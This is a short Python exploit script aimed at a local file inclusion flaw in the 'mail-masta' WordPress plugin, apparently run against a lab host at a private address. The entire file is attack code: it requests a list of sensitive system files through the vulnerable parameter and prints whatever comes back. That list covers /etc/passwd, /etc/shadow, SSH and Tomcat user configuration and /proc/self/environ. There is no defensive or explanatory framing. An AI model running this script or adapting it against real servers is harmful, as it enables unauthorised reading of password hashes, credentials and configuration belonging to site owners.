#!/usr/bin/env python3

import requests

url = "http://192.168.1.22/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl="

local_files = [
    "/etc/passwd", "/etc/shadow", "/var/log/messages", "/etc/hostname", "/etc/hosts",
    "/etc/bashrc", "/etc/group", "/etc/fstab", "/etc/resolv.conf", "/run/sshd.pid", 
    "/etc/issue", "/etc/ssh/ssh_config", "/etc/ssh/ssh_host_rsa_key.pub",
    "/etc/httpd/conf/httpd.conf", "/etc/tomcat/tomcat-users.xml",
    "/etc/tomcat/tomcat.conf", "/etc/crontab", "/etc/security/passwd",
    "/proc/self/environ" 
]


for file in local_files:
    r = requests.get(url + file)
    if (r.text):
        print("[+]-- Output of " + file + " --[+]")
        print(r.text)
    else:
        print("[X]-- " + file + " could not be enumerated --[X]")
